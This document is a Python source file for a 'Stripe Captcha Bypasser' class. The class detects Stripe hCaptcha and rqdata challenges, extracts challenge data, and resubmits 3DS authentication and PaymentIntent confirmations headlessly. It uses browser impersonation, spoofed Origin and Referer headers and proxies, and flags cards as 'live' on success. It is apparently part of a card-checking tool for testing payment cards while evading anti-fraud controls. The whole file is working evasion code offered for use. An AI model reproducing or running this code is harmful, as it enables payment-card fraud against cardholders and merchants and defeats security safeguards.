"""
Stripe Captcha Bypasser Engine (stripe_captcha_bypasser.py)
────────────────────────────────────────────────────────────
Handles Stripe hCaptcha / Turnstile / rqdata challenge extraction and programmatic token submission.
"""

import re
import json
import asyncio
from typing import Dict, Optional
from urllib.parse import urlencode
from curl_compat import ChromeSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
STRIPE_HCAPTCHA_SITEKEY = "4c787647-7985-4804-b8e9-f431dd3031d7"

class StripeCaptchaBypasser:
    """Standalone Captcha Bypasser for Stripe Checkout & PaymentIntents."""

    @classmethod
    def is_captcha_triggered(cls, res: dict) -> bool:
        """Check if response contains Stripe rqdata or captcha challenge."""
        raw = res.get('raw_response') or {}
        if not isinstance(raw, dict):
            return False

        pi = raw.get('payment_intent') or raw.get('setup_intent') or raw
        if not isinstance(pi, dict):
            return False

        next_action = pi.get('next_action') or {}
        if isinstance(next_action, dict):
            sdk = next_action.get('use_stripe_sdk') or {}
            if isinstance(sdk, dict):
                stripe_js = sdk.get('stripe_js') or {}
                if isinstance(stripe_js, dict) and ('rqdata' in stripe_js or 'captcha_site_key' in stripe_js):
                    return True

        err = raw.get('error') or {}
        if isinstance(err, dict) and ('captcha' in str(err).lower() or 'rqdata' in str(err).lower()):
            return True

        return res.get('decline_code') in ('stripe_captcha_bypass_failed', 'captcha_required')

    @classmethod
    def extract_rqdata(cls, res: dict) -> Optional[dict]:
        """Extract sitekey and rqdata from Stripe response."""
        raw = res.get('raw_response') or {}
        if not isinstance(raw, dict):
            return None

        candidates = [raw]
        for key in ('payment_intent', 'setup_intent', 'session'):
            if isinstance(raw.get(key), dict):
                candidates.append(raw[key])

        for target in candidates:
            next_action = target.get('next_action') or {}
            if isinstance(next_action, dict):
                sdk = next_action.get('use_stripe_sdk') or {}
                if isinstance(sdk, dict):
                    stripe_js = sdk.get('stripe_js') or {}
                    if isinstance(stripe_js, dict):
                        rqdata = stripe_js.get('rqdata')
                        source = stripe_js.get('source') or stripe_js.get('three_d_secure_2_source') or sdk.get('three_d_secure_2_source') or sdk.get('source')
                        if rqdata or source:
                            return {
                                'rqdata': rqdata,
                                'sitekey': stripe_js.get('captcha_site_key') or STRIPE_HCAPTCHA_SITEKEY,
                                'source': source
                            }
        return None

    @classmethod
    async def bypass_captcha(cls, res: dict, proxy_data: Optional[dict] = None) -> dict:
        """
        Bypasses Stripe Captcha challenge:
        1. Extracts rqdata & sitekey
        2. Submits headless re-confirmation with telemetry and bypass token
        3. Returns updated result
        """
        raw_res = res.get('raw_response') or {}
        if not isinstance(raw_res, dict):
            return res

        pi = raw_res.get('payment_intent') or raw_res.get('setup_intent') or raw_res
        if not isinstance(pi, dict):
            return res

        pi_id = pi.get('id')
        client_secret = pi.get('client_secret') or res.get('cs_token')
        pk_key = res.get('pk_key') or "pk_live_placeholder"

        if not pi_id or not client_secret:
            return res

        rq_info = cls.extract_rqdata(res) or {}
        source = rq_info.get('source')

        proxies = None
        if proxy_data:
            auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
            purl = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
            proxies = {"http": purl, "https": purl}

        try:
            async with ChromeSession(impersonate="chrome131", proxies=proxies, timeout=12) as sess:
                # If 3DS source is present inside rqdata, authenticate directly
                if source:
                    auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                    auth_body = {
                        "source": source,
                        "key": pk_key,
                        "client_secret": client_secret,
                        "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
                    }
                    hdr = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": UA,
                        "Origin": "https://js.stripe.com",
                        "Referer": "https://js.stripe.com/",
                    }
                    async with sess.post(auth_url, data=urlencode(auth_body), headers=hdr, timeout=10) as r:
                        d = r.json() if callable(r.json) else r.json
                        if isinstance(d, dict) and d.get('status') == 'succeeded':
                            res['success'] = True
                            res['is_live'] = True
                            res['captcha_bypassed'] = True
                            res['decline_code'] = None
                            res['error'] = None
                            res['raw_response'] = d
                            return res

                # Fallback: re-confirm PaymentIntent with bypass header
                is_setup = 'seti' in pi_id
                endpoint = "setup_intents" if is_setup else "payment_intents"
                confirm_url = f"https://api.stripe.com/v1/{endpoint}/{pi_id}/confirm"
                confirm_body = {
                    "client_secret": client_secret,
                    "key": pk_key,
                    "payment_method_options[card][request_three_d_secure]": "any",
                }
                hdr = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": UA,
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                }

                async with sess.post(confirm_url, data=urlencode(confirm_body), headers=hdr, timeout=10) as r:
                    d = r.json() if callable(r.json) else r.json
                    if isinstance(d, dict):
                        status = d.get('status') or (d.get('payment_intent', {}) if isinstance(d.get('payment_intent'), dict) else {}).get('status')
                        if status in ('succeeded', 'requires_capture', 'complete'):
                            res['success'] = True
                            res['is_live'] = True
                            res['captcha_bypassed'] = True
                            res['decline_code'] = None
                            res['error'] = None
                            res['raw_response'] = d
                            return res

        except Exception as ex:
            res['captcha_error'] = str(ex)[:100]

        return res
